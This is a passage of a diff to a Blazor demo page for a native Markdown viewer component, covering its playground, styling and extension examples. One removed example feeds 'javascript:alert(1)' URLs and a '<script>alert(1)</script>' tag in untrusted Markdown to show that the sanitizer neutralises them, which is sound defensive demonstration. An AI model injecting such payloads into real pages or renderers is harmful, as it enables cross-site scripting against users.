+`MaxLength` reads well, but the docs should say it counts characters.
+
+```csharp
+var viewer = new BitMarkdownViewer { MaxLength = 100_000 };
+```
+";
+
+
+
+    private enum MarkdownFlavor { Basic, GitHub, Advanced }
 
     private MarkdownFlavor playgroundFlavor = MarkdownFlavor.Advanced;
     private BitMarkdownPipeline playgroundPipeline = BitMarkdownPipelines.Advanced;
@@ -1179,9 +1104,9 @@ An [absolute link](https://bitplatform.dev) is left alone.
 
     private string playgroundHint => playgroundFlavor switch
     {
-        MarkdownFlavor.Basic => "Basic CommonMark only - reference links and character references still work, but tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text.",
-        MarkdownFlavor.GitHub => "The GitHub flavors: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts.",
-        _ => "Advanced: the GitHub flavors plus front matter, the emphasis extras (~sub~, ^sup^, ++ins++, ==mark==), :::containers, definition lists, abbreviations, figures, :sparkles: emoji and automatic heading ids."
+        MarkdownFlavor.Basic => "Basic: the CommonMark core only - tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text.",
+        MarkdownFlavor.GitHub => "GitHub: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts.",
+        _ => "Advanced: the GitHub flavors plus front matter, the emphasis extras, :::containers, definition lists, abbreviations, figures, :sparkles: emoji and heading ids."
     };
 
     private const string SampleMarkdown = """
@@ -1190,87 +1115,43 @@ An [absolute link](https://bitplatform.dev) is left alone.
         A **native Blazor** Markdown viewer written in _pure C#_ - no JavaScript,
         no `innerHTML`, and ~~no external dependencies~~ zero external dependencies.
 
-        ## Why it exists
+        ## Feature highlights
 
-        Most Blazor Markdown components wrap a JavaScript library and marshal strings
-        across the interop boundary. This one parses Markdown into an AST and renders
-        it straight to the Blazor render tree, so the output is **real DOM**.
-
-        ### Feature highlights
-
-        - Headings (ATX `#` and Setext)
         - **Bold**, *italic*, ***bold italic***, and ~~strikethrough~~
         - H~2~O, x^2^, ++inserted++ and ==highlighted== (the emphasis extras)
-        - `inline code` and fenced code blocks
         - [Links](https://learn.microsoft.com/aspnet/core/blazor) and images
-        - Ordered and unordered lists, including nesting:
+        - Nested lists:
             1. First item
             2. Second item
                 - nested bullet
-                - another one
-            3. Third item
-        - GitHub-style task lists:
+        - Task lists:
             - [x] Parse blocks
-            - [x] Parse inlines
             - [ ] Conquer the world
 
         ## Code
-
-        Inline: `var viewer = new BitMarkdownViewer();`
 
         ```csharp
         public static BitMarkdownDocumentNode Parse(string? markdown)
         {
             var document = new BitMarkdownDocumentNode();
-            if (string.IsNullOrEmpty(markdown))
-                return document;
             return document;
         }
         ```
 
-        ## Alerts
-
         > [!TIP]
         > Switch the Flavor above to Basic and watch this become an ordinary block quote.
 
-        ## Blockquotes
-
-        > "Any sufficiently advanced technology is indistinguishable from magic."
-        >
-        > - Arthur C. Clarke
-
-        ## Tables
-
         | Feature        | Supported | Notes                  |
         | :------------- | :-------: | ---------------------: |
-        | Headings       |    Yes    | Levels 1-6             |
         | Tables         |    Yes    | With column alignment  |
-        | Task lists     |    Yes    | GitHub flavoured       |
         | Raw HTML       |    No     | Escaped for safety     |
-
-        ## Links and notes
 
         Reference links keep the prose clean[^why]: see the [bit platform][bit] site.
 
         [bit]: https://bitplatform.dev "bit platform"
-        [^why]: The destination is declared once, at the bottom, instead of interrupting
-            the sentence.
+        [^why]: The destination is declared once, at the bottom.
 
-        ## Safety
-
-        Link and image URLs are sanitized, so `javascript:` URIs are stripped and raw
-        HTML in the source is rendered as text rather than executed.
-
-        ## Plugins (try the Flavor switch above)
-
-        With the **Advanced** flavor you also get emoji and autolinks:
-
-        - Emoji shortcodes: :rocket: :sparkles: :tada: :fire: :+1:
-        - Bare URLs become links: https://learn.microsoft.com
-        - Email autolinks: support@example.com
-        - Character references: &copy; 2026 &mdash; decoded everywhere but in `code`
-
-        Switch to **Basic** to see the same source rendered as plain CommonMark.
+        Emoji :rocket: :tada:, bare URLs https://learn.microsoft.com and &copy; 2026.
 
         ---
 
@@ -1279,7 +1160,50 @@ An [absolute link](https://bitplatform.dev) is left alone.
 
 
 
-    // -- RTL example ---------------------------------------------------------
+    private readonly BitMarkdownViewerParams[] markdownViewerParams =
+    [
+        new()
+        {
+            Pipeline = BitMarkdownPipelines.GitHub,
+            HeadingLevelOffset = 2,
+            ImageRendering = BitMarkdownViewerImageRendering.None,
+        }
+    ];
+
+    private readonly string cascadingMarkdown = @"# Release 9.4
+
+- [x] ~~Old~~ parser replaced
+- [ ] Docs
+
+| Flavor | Cascaded |
+|--------|:--------:|
+| GitHub |    ✔     |
+";
+
+
+
+    private readonly string cssVariablesStyle = @"--bit-MarkdownViewer-font-family: Georgia, 'Times New Roman', serif;
+--bit-MarkdownViewer-line-height: 1.8;
+--bit-MarkdownViewer-heading-color: #a855f7;
+--bit-MarkdownViewer-heading-border-color: #a855f7;
+--bit-MarkdownViewer-code-background: rgba(168, 85, 247, 0.15);
+--bit-MarkdownViewer-blockquote-border-color: #a855f7;
+--bit-MarkdownViewer-table-header-background: rgba(168, 85, 247, 0.15);
+--bit-MarkdownViewer-table-stripe-background: transparent;";
+
+    private readonly string cssVariablesMarkdown = @"## Restyled with variables
+
+A serif body, purple headings and `tinted code`.
+
+> A quote with a purple bar.
+
+| Column | Value |
+|--------|------:|
+| one    |     1 |
+| two    |     2 |
+";
+
+
 
     private readonly string rtlMarkdown = @"# نمایشگر مارک‌داون
 
@@ -1298,755 +1222,12 @@ An [absolute link](https://bitplatform.dev) is left alone.
 | دو   |     ۲ |
 ";
 
+    private readonly string mixedDirectionMarkdown = @"## A comment thread
 
+Each paragraph takes the direction of its own text.
 
-    private readonly string example1RazorCode = @"
-<BitMarkdownViewer Markdown=""@(""# Native Markdown in Blazor\n\nRendered entirely in **C#** with no JavaScript and no third-party packages.\n\n- Real DOM output\n- Safe by default\n- Zero interop"")"" />";
+این پاراگراف فارسی است و از راست به چپ چیده می‌شود.
 
-    private readonly string example2RazorCode = @"
-<BitMarkdownViewer Markdown=""@gitHubMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
-    private readonly string example2CsharpCode = @"
-private readonly string gitHubMarkdown = @""# GitHub Flavored Markdown
-
-Supports ~~strikethrough~~ and bare links like https://bitplatform.dev
-
-## Task list
-
-- [x] Parse Markdown in pure C#
-- [x] Render the real render tree
-- [ ] Use any JavaScript
-
-## Table
-
-| Feature       | Basic | GitHub |
-|:--------------|:-----:|:------:|
-| Headings      |   ✔   |   ✔    |
-| Tables        |       |   ✔    |
-| Strikethrough |       |   ✔    |
-"";";
-
-    private readonly string example3RazorCode = @"
-<BitMarkdownViewer Markdown=""@alertsMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
-    private readonly string example3CsharpCode = @"
-private readonly string alertsMarkdown = @""> [!NOTE]
-> Useful information that users should know, even when skimming content.
-
-> [!TIP]
-> Helpful advice for doing things better or more easily.
-
-> [!IMPORTANT]
-> Key information users need to know to achieve their goal.
-
-> [!WARNING]
-> Urgent info that needs immediate user attention to avoid problems.
-
-> [!CAUTION]
-> Advises about risks or negative outcomes of certain actions.
-
-> A block quote without a marker is still an ordinary block quote.
-"";";
-
-    private readonly string example4RazorCode = @"
-<BitMarkdownViewer Markdown=""@footnotesMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
-    private readonly string example4CsharpCode = @"
-private readonly string footnotesMarkdown = @""The parser walks the source once[^once] and hands the renderer an AST[^ast],
-which is why the same note can be cited twice[^once].
-
-[^once]: One pass over the lines, then one pass over the inline text of each block.
-[^ast]: An abstract syntax tree - the tree of headings, paragraphs and inline runs
-    that the render tree is built from.
-"";";
-
-    private readonly string example5RazorCode = @"
-<BitMarkdownViewer Markdown=""@referencesMarkdown"" />";
-    private readonly string example5CsharpCode = @"
-private readonly string referencesMarkdown = @""# Reference links
-
-The [bit platform][bit] site, the [Blazor docs][docs], and the same
-[bit] link again as a shortcut reference.
-
-Character references are decoded too: &copy; 2026 &mdash; &#169; is the same
-sign written as a number, and &#x2705; as hex. Inside code they stay literal:
-`&copy;`.
-
-[bit]: https://bitplatform.dev """"bit platform""""
-[docs]: https://learn.microsoft.com/aspnet/core/blazor """"ASP.NET Core Blazor""""
-"";";
-
-    private readonly string example6RazorCode = @"
-<BitMarkdownViewer Markdown=""@emphasisExtrasMarkdown"" Pipeline=""@emphasisExtrasPipeline"" />";
-    private readonly string example6CsharpCode = @"
-private readonly BitMarkdownPipeline emphasisExtrasPipeline = new BitMarkdownPipelineBuilder()
-    .UseEmphasisExtras()
-    .Build();
-
-private readonly string emphasisExtrasMarkdown = @""Water is H~2~O, the area of a circle is πr^2^, and 2^10^ = 1024.
-
-This release ++adds streaming++ and ~~drops the old overload~~, so ==read the migration notes== first.
-
-Ordinary prose is left alone: 1 + 2 = 3, and a+b is not inserted text.
-"";";
-
-    private readonly string example7RazorCode = @"
-<div class=""mdv-columns"">
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">Default</div>
-        <BitMarkdownViewer Markdown=""@typographyMarkdown"" />
-    </div>
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">UseSmartyPants()</div>
-        <BitMarkdownViewer Markdown=""@typographyMarkdown"" Pipeline=""@smartyPantsPipeline"" />
-    </div>
-</div>";
-    private readonly string example7CsharpCode = @"
-private readonly BitMarkdownPipeline smartyPantsPipeline = new BitMarkdownPipelineBuilder()
-    .UseSmartyPants()
-    .Build();
-
-private readonly string typographyMarkdown = @""""""Typography matters,"""" she said -- and it's hard to disagree...
-
-The 2024--2026 range uses an en dash; an aside uses an em dash --- like this one.
-
-Code keeps every character: `--- """"not curled"""" ...`
-"";";
-
-    private readonly string example8RazorCode = @"
-<div class=""mdv-columns"">
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">Default</div>
-        <BitMarkdownViewer Markdown=""@frontMatterMarkdown"" />
-    </div>
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">UseFrontMatter()</div>
-        <BitMarkdownViewer Markdown=""@frontMatterMarkdown"" Pipeline=""@frontMatterPipeline"" OnParsed=""HandleFrontMatterParsed"" />
-        <div class=""mdv-hint"">Metadata read from the AST: @frontMatterText</div>
-    </div>
-</div>";
-    private readonly string example8CsharpCode = @"
-private readonly BitMarkdownPipeline frontMatterPipeline = new BitMarkdownPipelineBuilder()
-    .UseFrontMatter()
-    .Build();
-
-private string frontMatterText = string.Empty;
-
-private void HandleFrontMatterParsed(BitMarkdownDocumentNode document)
-{
-    var frontMatter = BitMarkdownFrontMatterNode.Find(document);
-    frontMatterText = frontMatter is null ? ""(none)"" : frontMatter.Text.ReplaceLineEndings("" | "");
-}
-
-private readonly string frontMatterMarkdown = @""---
-title: Release notes
-date: 2026-09-09
-tags: [blazor, markdown]
----
-
-# Release notes
-
-The metadata above describes the file; it is not part of the document.
-"";";
-
-    private readonly string example9RazorCode = @"
-<BitMarkdownViewer Markdown=""@containersMarkdown"" Pipeline=""@containersPipeline"" />";
-    private readonly string example9CsharpCode = @"
-private readonly BitMarkdownPipeline containersPipeline = new BitMarkdownPipelineBuilder()
-    .UseContainers()
-    .Build();
-
-private readonly string containersMarkdown = @"":::tip Start here
-Containers are fenced with three colons. The first word names the container.
-:::
-
-:::warning Read this first
-The rest of the line is the title, and the body is **ordinary Markdown**.
-
-:::note
-Containers nest, so an aside can sit inside one.
-:::
-
-:::
-
-:::details How the fence is read
-The word after the fence names the container; the rest of the line is its title.
-
-This one is a real `<details>`, so it opens and closes.
-:::
-
-:::glossary
-A name the stylesheet has no opinion about is a plain block you style yourself.
-:::
-"";";
-
-    private readonly string example10RazorCode = @"
-<BitMarkdownViewer Markdown=""@definitionListMarkdown"" Pipeline=""@definitionListPipeline"" />";
-    private readonly string example10CsharpCode = @"
-private readonly BitMarkdownPipeline definitionListPipeline = new BitMarkdownPipelineBuilder()
-    .UseDefinitionLists()
-    .Build();
-
-private readonly string definitionListMarkdown = @""Pipeline
-: The immutable set of flavors a document is parsed with.
-: Build it once and share it.
-
-AST
-: The tree of headings, paragraphs and inline runs the parser produces.
-
-    A definition indented under its own text may run to several paragraphs,
-    or hold a list:
-
-    - one
-    - two
-"";";
-
-    private readonly string example11RazorCode = @"
-<BitMarkdownViewer Markdown=""@abbreviationMarkdown"" Pipeline=""@abbreviationPipeline"" />";
-    private readonly string example11CsharpCode = @"
-private readonly BitMarkdownPipeline abbreviationPipeline = new BitMarkdownPipelineBuilder()
-    .UseAbbreviations()
-    .Build();
-
-private readonly string abbreviationMarkdown = @""*[HTML]: HyperText Markup Language
-*[AST]: Abstract Syntax Tree
-*[CSP]: Content Security Policy
-
-The parser builds an AST and the renderer writes HTML from it, which is what keeps
-the output usable under a strict CSP.
-
-Only whole words are expanded, so HTMLElement keeps its own name and `HTML` inside
-code stays literal.
-"";";
-
-    private readonly string example12RazorCode = @"
-<div class=""mdv-columns"">
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">No typesetter</div>
-        <BitMarkdownViewer Markdown=""@mathMarkdown"" Pipeline=""@mathPipeline"" />
-    </div>
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">KaTeX</div>
-        <KatexTypesetter>
-            <BitMarkdownViewer Markdown=""@mathMarkdown"" Pipeline=""@mathPipeline"" />
-        </KatexTypesetter>
-    </div>
-</div>";
-    private readonly string example12CsharpCode = @"
-private readonly BitMarkdownPipeline mathPipeline = new BitMarkdownPipelineBuilder()
-    .UseMathematics()
-    .Build();
-
-private readonly string mathMarkdown = @""Euler's identity, $e^{i\pi} + 1 = 0$, in one line.
-
-$$
-\int_0^1 x^2 \, dx = \frac{1}{3}
-$$
-
-Prices are left alone: this costs $5 and that one $10.
-"";";
-    private readonly string example12TypesetterCode = @"
-@* Typesets the TeX the viewer leaves in place, once it has rendered it. *@
-@inject IJSRuntime JSRuntime
-
-<div @ref=""host"">@ChildContent</div>
-
-@code {
-    private ElementReference host;
-
-    [Parameter] public RenderFragment? ChildContent { get; set; }
-
-    protected override async Task OnAfterRenderAsync(bool firstRender)
-    {
-        // The script skips what it has already typeset, so only math drawn since is touched.
-        await JSRuntime.InvokeVoidAsync(""typesetMath"", host);
-    }
-}";
-    private readonly string example12ScriptCode = @"
-// Loaded by a <script> tag after Blazor's own. KaTeX is fetched the first time math is typeset.
-const katexBaseUrl = 'https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.18.6/';
-let katexLoading;
-
-function loadKatex() {
-    katexLoading ??= new Promise((resolve, reject) => {
-        const link = document.createElement('link');
-        link.rel = 'stylesheet';
-        link.href = katexBaseUrl + 'katex.min.css';
-        document.head.appendChild(link);
-
-        const script = document.createElement('script');
-        script.src = katexBaseUrl + 'katex.min.js';
-        script.onload = () => resolve();
-        script.onerror = () => {
-            katexLoading = undefined;
-            reject(new Error('KaTeX could not be loaded.'));
-        };
-        document.head.appendChild(script);
-    });
-
-    return katexLoading;
-}
-
-// The class is read rather than the delimiters: KaTeX's auto-render does not take a single $ as
-// one by default, and the viewer has already told math from prices.
-async function typesetMath(element) {
-    if (element == null) return;
-
-    try {
-        await loadKatex();
-    } catch {
-        return; // with no typesetter the TeX still reads as itself
-    }
-
-    element.querySelectorAll('.math:not([data-typeset])').forEach(math => {
-        const display = math.classList.contains('math-display');
-        const delimiter = display ? 2 : 1;
-        const tex = (math.textContent ?? '').slice(delimiter, -delimiter);
-
-        katex.render(tex, math, { displayMode: display, throwOnError: false });
-        math.dataset.typeset = '';
-    });
-}";
-    private readonly DemoCodeFile[] example12CodeFiles;
-
-    private readonly string example13RazorCode = @"
-<BitMarkdownViewer Markdown=""@figureMarkdown"" Pipeline=""@figurePipeline"" />";
-    private readonly string example13CsharpCode = @"
-private readonly BitMarkdownPipeline figurePipeline = new BitMarkdownPipelineBuilder()
-    .UseFigures()
-    .Build();
-
-private readonly string figureMarkdown = @""![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png """"The logo, as a captioned figure"""")
-
-An image with no title stays an ordinary image:
-
-![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)
-"";";
-
-    private readonly string example14RazorCode = @"
-<div class=""mdv-columns"">
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">Default</div>
-        <BitMarkdownViewer Markdown=""@lineBreaksMarkdown"" />
-    </div>
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">UseSoftLineAsHardLine()</div>
-        <BitMarkdownViewer Markdown=""@lineBreaksMarkdown"" Pipeline=""@softBreakPipeline"" />
-    </div>
-</div>";
-    private readonly string example14CsharpCode = @"
-private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
-    .UseSoftLineAsHardLine()
-    .Build();
-
-private readonly string lineBreaksMarkdown = @""Roses are red
-Violets are blue
-Markdown reflows
-Unless you tell it not to"";";
-
-    private readonly string example15RazorCode = @"
-<BitMarkdownViewer Markdown=""@customMarkdown"" Pipeline=""customPipeline"" />";
-    private readonly string example15CsharpCode = @"
-private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
-    .UsePipeTables()
-    .UseStrikethrough()
-    .UseTaskLists()
-    .UseEmojis()
-    .UseAutoIdentifiers()
-    .Build();
-
-private readonly string customMarkdown = @""# Custom pipeline :sparkles:
-
-This viewer uses a pipeline composed with only the extensions we picked:
-pipe tables, strikethrough, task lists, emoji and auto identifiers.
-Autolinks were left out, so https://bitplatform.dev stays plain text.
-
-- [x] ~~Old~~ approach replaced
-- [ ] Anything left to do?
-"";";
-
-    private readonly string example16RazorCode = @"
-<div class=""mdv-toolbar"">
-    <span class=""mdv-label"">ImageRendering:</span>
-    @foreach (var mode in imageRenderingModes)
-    {
-        <BitButton Size=""BitSize.Small""
-                   aria-pressed=""@(imageRendering == mode ? ""true"" : ""false"")""
-                   Variant=""@(imageRendering == mode ? BitVariant.Fill : BitVariant.Outline)""
-                   OnClick=""@(() => imageRendering = mode)"">@mode</BitButton>
-    }
-</div>
-<BitMarkdownViewer Markdown=""@untrustedMarkdown""
-                   Pipeline=""BitMarkdownPipelines.GitHub""
-                   ImageRendering=""@imageRendering""
-                   StripBidiControlCharacters=""true""
-                   MaxLength=""100000"" />";
-    private readonly string example16CsharpCode = @"
-private static readonly BitMarkdownViewerImageRendering[] imageRenderingModes =
-[
-    BitMarkdownViewerImageRendering.SameOrigin,
-    BitMarkdownViewerImageRendering.None,
-    BitMarkdownViewerImageRendering.All
-];
-
-private BitMarkdownViewerImageRendering imageRendering = BitMarkdownViewerImageRendering.SameOrigin;
-
-private readonly string untrustedMarkdown = @""### Content from somewhere else
-
-A same-origin image always loads:
-
-![the bit logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)
-
-A cross-origin one only loads under `All`:
-
-![a remote badge](https://img.shields.io/nuget/v/Bit.BlazorUI.Extras)
-
-Unsafe URLs never survive the sanitizer, whatever the policy:
-[a javascript link](javascript:alert(1)) and ![an unsafe image](javascript:alert(1)).
-
-Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
-"";";
-
-    private readonly string example17RazorCode = @"
-<div class=""mdv-toc-layout"">
-    <nav class=""mdv-toc"" aria-label=""On this page"">
-        <div class=""mdv-toc-title"">On this page</div>
-        @foreach (var entry in tocEntries)
-        {
-            <a class=""@($""mdv-toc-item mdv-toc-level-{entry.Level}"")"" href=""@($""#{entry.Id}"")"">@entry.Text</a>
-        }
-    </nav>
-    <BitMarkdownViewer Markdown=""@tocMarkdown"" Pipeline=""BitMarkdownPipelines.Advanced"" OnParsed=""HandleParsed"" />
-</div>
-<div>Excerpt: @tocExcerpt</div>";
-    private readonly string example17CsharpCode = @"
-private record TocEntry(int Level, string Id, string Text);
-
-private List<TocEntry> tocEntries = [];
-
-private string tocExcerpt = string.Empty;
-
-private void HandleParsed(BitMarkdownDocumentNode document)
-{
-    tocEntries = BitMarkdownAstHelper.Descendants(document)
-                                     .OfType<BitMarkdownHeadingNode>()
-                                     .Where(h => string.IsNullOrEmpty(h.Id) is false)
-                                     .Select(h => new TocEntry(h.Level, h.Id!, BitMarkdownInlineHelpers.PlainText(h.Inlines)))
-                                     .ToList();
-
-    var text = BitMarkdownAstHelper.ToPlainText(document).ReplaceLineEndings("" "");
-    tocExcerpt = text.Length > 120 ? text[..120] + ""..."" : text;
-}
-
-private readonly string tocMarkdown = @""# Release notes
-
-## 9.4.0
-
-### Added
-
-Footnotes, alerts and reference links.
-
-### Fixed
-
-Truncation no longer splits a surrogate pair.
-
-## 9.3.0
-
-### Added
-
-The whole native parser.
-"";";
-
-    private readonly string example18RazorCode = @"
-<BitMarkdownViewer Markdown=""@anchorsMarkdown"" Pipeline=""@anchorsPipeline"" />";
-    private readonly string example18CsharpCode = @"
-private readonly BitMarkdownPipeline anchorsPipeline = new BitMarkdownPipelineBuilder()
-    .UseAutoIdentifiers(anchorLinks: true)
-    .Build();
-
-private readonly string anchorsMarkdown = @""## Installation {#install}
-
-Hover a heading to reveal the permalink beside it. This one names its own id, so the
-link to it survives a rewording of the heading.
-
-### Package manager
-
-### .NET CLI
-"";";
-
-    private readonly string example19RazorCode = @"
-Formatting a value in place:
-<BitMarkdownViewer Inline Markdown=""@(""the **fastest** path is `Span<T>` - [read why](https://learn.microsoft.com/dotnet/api/system.span-1)"")"" />";
-
-    private readonly string example20RazorCode = @"
-<BitMarkdownViewer Markdown=""@templatesMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"">
-    <CodeBlockTemplate>
-        <div class=""mdv-code-card"">
-            <div class=""mdv-code-card-head"">
-                <span>@(context.Info ?? ""text"")</span>
-                <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" IconName=""@BitIconName.Copy"" Title=""Copy"" />
-            </div>
-            <pre><code>@context.Content</code></pre>
-        </div>
-    </CodeBlockTemplate>
-    <LinkTemplate>
-        <BitLink Href=""@context.Url"">
-            @BitMarkdownInlineHelpers.PlainText(context.Children)
-            <BitIcon IconName=""@BitIconName.NavigateExternalInline"" />
-        </BitLink>
-    </LinkTemplate>
-</BitMarkdownViewer>";
-    private readonly string example20CsharpCode = @"
-private readonly string templatesMarkdown = @""Every code block below is drawn by the template, not by the viewer:
-
-```csharp
-var pipeline = new BitMarkdownPipelineBuilder().UseGitHubFlavored().Build();
-```
-
-```bash
-dotnet add package Bit.BlazorUI.Extras
-```
-
-And every link, like [the bit platform](https://bitplatform.dev), gets its own chrome.
-"";";
-    private readonly string example20ScssCode = @"
-// The code-block template's own chrome: a header naming the language beside a copy button,
-// with the block itself underneath.
-::deep .mdv-code-card {
-    margin-bottom: 1rem;
-    overflow: hidden;
-    border-radius: 0.5rem;
-    border: 1px solid $bit-color-border-secondary;
-}
-
-::deep .mdv-code-card-head {
-    display: flex;
-    gap: 0.5rem;
-    align-items: center;
-    justify-content: space-between;
-    padding: 0.25rem 0.25rem 0.25rem 0.75rem;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-    font-size: 0.75rem;
-    color: $bit-color-foreground-secondary;
-    background: $bit-color-background-secondary;
-}
-
-::deep .mdv-code-card pre {
-    margin: 0;
-    border-radius: 0;
-}";
-    private readonly DemoCodeFile[] example20CodeFiles;
-
-    private readonly string example21RazorCode = @"
-<BitMarkdownViewer Markdown=""@taskListMarkdown""
-                   Pipeline=""BitMarkdownPipelines.GitHub""
-                   OnTaskChanged=""HandleTaskChanged"" />
-<div>@taskListStatus</div>";
-    private readonly string example21CsharpCode = @"
-private string taskListMarkdown = @""## Release checklist
-
-- [x] Write the parser
-- [x] Write the renderer
-- [ ] Write the docs
-- [ ] Ship it
-
-Nested items count too:
-
-- [ ] Polish
-    - [ ] Icons
-    - [ ] Copy
-"";
-
-private string taskListStatus = ""Tick a box to see the rewritten source."";
-
-private void HandleTaskChanged(BitMarkdownViewerTaskChangedEventArgs args)
-{
-    // The viewer hands over the new source; storing it is what makes the change stick.
-    taskListMarkdown = args.Markdown;
-    taskListStatus = $""Task {args.Index + 1} is now {(args.Checked ? ""done"" : ""open"")}."";
-}";
-
-    private readonly string example22RazorCode = @"
-<BitMarkdownViewer Markdown=""@linkPolicyMarkdown"" Pipeline=""@linkPolicyPipeline"" />";
-    private readonly string example22CsharpCode = @"
-private readonly BitMarkdownPipeline linkPolicyPipeline = new BitMarkdownPipelineBuilder()
-    .UseLinkOptions(externalTarget: BitMarkdownLinkTarget.Self,
-                    externalRel: ""noopener noreferrer nofollow ugc"")
-    .Build();
-
-private readonly string linkPolicyMarkdown = @""A link a reader wrote to [somewhere else](https://example.com)
-opens in the same tab and is marked `nofollow ugc`.
-
-A link to [another page here](/components/markdownviewer) is untouched, and so is one to
-[a section](#example1) of this page.
-"";";
-
-    private readonly string example23RazorCode = @"
-<div class=""mdv-columns"">
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">Default</div>
-        <BitMarkdownViewer Markdown=""@baseUrlMarkdown"" ImageRendering=""BitMarkdownViewerImageRendering.All"" />
-    </div>
-    <div class=""mdv-column"">
-        <div class=""mdv-column-title"">UseBaseUrl(...)</div>
-        <BitMarkdownViewer Markdown=""@baseUrlMarkdown"" Pipeline=""@baseUrlPipeline"" ImageRendering=""BitMarkdownViewerImageRendering.All"" />
-    </div>
-</div>";
-    private readonly string example23CsharpCode = @"
-private readonly BitMarkdownPipeline baseUrlPipeline = new BitMarkdownPipelineBuilder()
-    .UseBaseUrl(""/_content/Bit.BlazorUI.Demo.Client.Core/images/"")
-    .Build();
-
-// The general form, for a CDN or for stripping tracking parameters:
-// new BitMarkdownPipelineBuilder()
-//     .UseUrlRewriter(context => context.IsImage && context.IsRelative
-//         ? ""https://cdn.example.com/"" + context.Url
-//         : context.Url)
-//     .Build();
-
-private readonly string baseUrlMarkdown = @""![the bit logo](bit-logo-blue.png)
-
-The image above is written with a relative path, the way a README in a repository writes one.
-An [absolute link](https://bitplatform.dev) is left alone.
-"";";
-
-    private readonly string example24RazorCode = @"
-<BitMarkdownViewer Dir=""BitDir.Rtl"" Markdown=""@localizedMarkdown"" Pipeline=""@localizedPipeline"" />";
-    private readonly string example24CsharpCode = @"
-private readonly BitMarkdownPipeline localizedPipeline = new BitMarkdownPipelineBuilder()
-    .UseGitHubFlavored()
-    .UseTexts(new BitMarkdownTexts
-    {
-        AlertNote = ""توجه"",
-        AlertTip = ""نکته"",
-        AlertImportant = ""مهم"",
-        AlertWarning = ""هشدار"",
-        AlertCaution = ""احتیاط"",
-        Footnotes = ""پی‌نوشت‌ها"",
-        FootnoteBackReference = ""بازگشت به ارجاع {0}"",
-        FootnoteBackReferenceOccurrence = ""بازگشت به ارجاع {0}-{1}"",
-        Table = ""جدول"",
-    })
-    .Build();";
-
-    private readonly string example25RazorCode = @"
-<div class=""mdv-playground"">
-    <div class=""mdv-toolbar"">
-        <span class=""mdv-label"">Flavor:</span>
-        <BitButton Size=""BitSize.Small""
-                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.Basic ? ""true"" : ""false"")""
-                   Variant=""@(playgroundFlavor == MarkdownFlavor.Basic ? BitVariant.Fill : BitVariant.Outline)""
-                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.Basic))"">Basic</BitButton>
-        <BitButton Size=""BitSize.Small""
-                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.GitHub ? ""true"" : ""false"")""
-                   Variant=""@(playgroundFlavor == MarkdownFlavor.GitHub ? BitVariant.Fill : BitVariant.Outline)""
-                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.GitHub))"">GitHub</BitButton>
-        <BitButton Size=""BitSize.Small""
-                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.Advanced ? ""true"" : ""false"")""
-                   Variant=""@(playgroundFlavor == MarkdownFlavor.Advanced ? BitVariant.Fill : BitVariant.Outline)""
-                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.Advanced))"">Advanced</BitButton>
-        <span class=""mdv-spacer""></span>
-        <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" OnClick=""ResetPlaygroundSample"">Reset sample</BitButton>
-        <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" OnClick=""@(() => playgroundMarkdown = string.Empty)"">Clear</BitButton>
-    </div>
-
-    <div class=""mdv-hint"">@playgroundHint</div>
-
-    <div class=""mdv-split"">
-        <textarea class=""mdv-editor"" spellcheck=""false"" aria-label=""Markdown editor"" @bind=""playgroundMarkdown"" @bind:event=""oninput""></textarea>
-        <div class=""mdv-preview"">
-            <BitMarkdownViewer Markdown=""@playgroundMarkdown""
-                               Pipeline=""@playgroundPipeline""
-                               ImageRendering=""BitMarkdownViewerImageRendering.SameOrigin""
-                               StripBidiControlCharacters=""true""
-                               MaxLength=""100000"" />
-        </div>
-    </div>
-</div>";
-    private readonly string example25CsharpCode = @"
-private enum MarkdownFlavor { Basic, GitHub, Advanced }
-
-private MarkdownFlavor playgroundFlavor = MarkdownFlavor.Advanced;
-private BitMarkdownPipeline playgroundPipeline = BitMarkdownPipelines.Advanced;
-private string playgroundMarkdown = SampleMarkdown; // a feature-rich sample document
-
-private void SetPlaygroundFlavor(MarkdownFlavor flavor)
-{
-    playgroundFlavor = flavor;
-    playgroundPipeline = flavor switch
-    {
-        MarkdownFlavor.Basic => BitMarkdownPipelines.Basic,
-        MarkdownFlavor.GitHub => BitMarkdownPipelines.GitHub,
-        _ => BitMarkdownPipelines.Advanced
-    };
-}
-
-private void ResetPlaygroundSample() => playgroundMarkdown = SampleMarkdown;
-
-private string playgroundHint => playgroundFlavor switch
-{
